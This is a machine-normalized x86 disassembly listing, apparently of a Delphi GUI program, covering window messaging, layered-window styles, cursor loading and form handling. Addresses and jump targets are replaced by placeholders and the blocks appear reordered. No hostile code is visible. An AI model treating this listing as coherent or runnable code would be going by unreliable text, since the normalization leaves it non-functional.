test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_44d34c
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_44fcf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44fd5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4032ec
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44fe24
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44fda8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44fe16
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fe1d
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_44e600
sub_44fe40
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_450108
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4321d0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_4522e0
xor edx edx
push ebp
push sub_4500eb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_4138dc
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_451310
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_44a210
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4500c9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_44fd90
xor edx edx
push ebp
push sub_450028
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44fcf0
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_4530ec
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_43a170
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45002f
mov eax [ ebp - 0x4 ]
call sub_44fd88
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_45002f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4500d3
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_451310
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_451310
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_413858
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_4139fc
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44a2c4
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_450118
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_436ea0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_450118
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_436e64
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_450188
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_450118
pop ecx
mov eax [ esi + 0x34 ]
call sub_445628
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_445638
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_45020c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4384c0
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_4032ec
sub_450230
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_4032ec
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_450260
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_436ea0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_450230
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_450260
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_436e64
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4502dc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_450230
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_450230
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_450260
pop ecx
test al al
je r-xdata
sub_450330
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_4032ec
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_450360
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_436ea0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_450330
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_450360
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_436e64
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4503dc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_450330
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_450330
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_450360
pop ecx
test al al
je r-xdata
sub_450430
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_413860
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_43fc70
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_450484
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_450430
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_4032ec
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450500
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_41a29c
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_45053c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_433e54
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_434b3c
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_450584
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_43a474
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_43a170
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_43a170
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_43a170
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_43a170
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_43a170
push eax
call RedrawWindow
sub_4506d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_44b488
mov dl 0x5
mov eax ebx
call sub_44d1fc
mov dl 0x1
mov eax ebx
call sub_438d4c
mov dl 0x3
mov eax ebx
call sub_44d4f8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_450740
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_450817
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_438c0c
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_438a78
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_432e84
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4338e4
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_403f9c
mov eax [ ebp - 0xc ]
call sub_40416c
push eax
mov eax [ ebp - 0xc ]
call sub_40436c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4338f4
mov eax [ ebp - 0xc ]
call sub_40416c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45081e
lea eax [ ebp - 0xc ]
call sub_403eac
retn
mov dl 0x1
mov eax esi
call sub_44c87c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4339a0
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4044f8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_450844
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_436ea0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_44bfa0
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_436e64
mov edx ebx
pop ecx
mov si 0xffcc
call sub_4032ec
inc ebp
dec edi
jne r-xdata
sub_450890
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_438c0c
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4508bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_439414
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_4508e4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_44ec4c
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43a170
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_438c0c
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43a170
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_43a170
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_438c20
or ecx 0xffffffff
mov dl 0x1
call sub_434030
pop esi
pop ebx
retn
sub_45097c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_439884
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_434b3c
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_433310
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_4032ec
sub_4509d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_450a9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4338e4
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_403f9c
mov eax [ ebp - 0x4 ]
call sub_40416c
push eax
mov eax [ ebp - 0x4 ]
call sub_40436c
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_4338f4
mov eax [ ebp - 0x4 ]
call sub_40416c
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4339a0
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450aa1
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_44c87c
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4044f8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_450ac0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_439604
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_438c0c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_438c20
mov dl [ ebx + 0x57 ]
call sub_433890
inc edi
dec esi
jne r-xdata
sub_450b64
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_450b94
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_450bc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419b0c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_450f68
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_450f74
mov eax ebx
call sub_450f80
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_44d39c
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c984
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c984
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c984
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_4513a0
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45127c
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45127c
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45127c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_450d1c
push ebx
push esi
push edi
push ebp
call sub_403464
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_4030f0
mov eax [ ebp + 0x88 ]
call sub_4030f0
mov eax [ ebp + 0x84 ]
call sub_4030f0
mov eax [ ebp + 0x54 ]
call sub_4030f0
mov eax [ ebp + 0x50 ]
call sub_4030f0
mov eax [ ebp + 0x4c ]
call sub_4030f0
mov eax [ ebp + 0x30 ]
call sub_4030f0
mov eax [ ebp + 0x34 ]
call sub_4030f0
mov eax [ ebp + 0x7c ]
call sub_4030f0
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_4030f0
mov eax ebp
call sub_450fdc
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_419b58
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40344c
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_413860
call sub_4030f0
inc edi
dec esi
jne r-xdata
sub_450e94
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_450ee0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413704
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413704
mov eax [ rw-data ]
call sub_453c6c
sub_450f18
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4139fc
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4139fc
mov eax [ rw-data ]
call sub_453c6c
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_43b5e0
sub_450f80
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_451038
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_450fdc
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026ec
mov ebx esi
test ebx ebx
jne r-xdata
sub_451038
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
